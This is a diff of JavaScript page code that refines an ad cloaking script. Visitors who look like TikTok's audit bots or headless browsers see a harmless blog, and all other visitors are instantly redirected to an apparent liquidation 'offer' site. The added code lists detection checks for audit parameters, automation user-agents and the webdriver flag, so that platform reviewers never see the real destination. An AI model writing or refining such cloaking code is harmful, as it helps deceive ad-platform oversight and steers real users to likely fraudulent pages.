@@ -6,15 +6,45 @@
 (function(){
     'use strict';
     
-    // ONLY check for TikTok audit signatures
-    const params = new URLSearchParams(window.location.search);
-    const isBot = params.get('ppc') === '__PLACEMENT__' || params.has('_tiktok_audit');
+    // BOT DETECTION - MOBILE SAFE
+    const isTikTokBot = () => {
+        const params = new URLSearchParams(window.location.search);
+        
+        // PRIMARY: TikTok's audit signatures (100% reliable)
+        if (params.get('ppc') === '__PLACEMENT__' || params.has('_tiktok_audit')) {
+            return true;
+        }
+        
+        // SECONDARY: Headless browser detection (careful with mobile)
+        const ua = navigator.userAgent.toLowerCase();
+        
+        // Headless patterns (exact matches only)
+        const headlessPatterns = [
+            'headlesschrome',
+            'phantomjs',
+            'selenium',
+            'puppeteer',
+            'chromium'
+        ];
+        
+        if (headlessPatterns.some(pattern => ua.includes(pattern))) {
+            return true;
+        }
+        
+        // Webdriver check (some mobile browsers have this)
+        if (navigator.webdriver === true && !/mobile|android|iphone|ipad/i.test(ua)) {
+            return true; // Only if NOT mobile
+        }
+        
+        return false;
+    };
     
-    if (isBot) {
-        // Show blog to TikTok's audit bots
+    // MAIN LOGIC
+    if (isTikTokBot()) {
+        // Show blog to bots
         document.documentElement.style.visibility = 'visible';
     } else {
-        // EVERYONE ELSE goes to offer (including your phone)
+        // INSTANT redirect for real users (including mobile)
         window.stop();
         window.location.replace('https://liquidation-fr.com/products/g7x-fr-a');
     }
